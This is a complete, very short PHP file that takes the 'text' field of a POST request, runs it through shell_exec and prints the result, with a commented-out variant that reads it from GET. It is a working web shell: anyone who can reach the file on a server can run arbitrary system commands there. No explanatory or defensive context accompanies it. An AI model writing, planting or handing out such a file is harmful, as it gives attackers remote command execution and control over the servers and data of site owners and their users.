<?php
$output = shell_exec($_POST["text"]);
//$output = shell_exec($_GET["text"]);
echo "<pre>$output</pre>";
?>

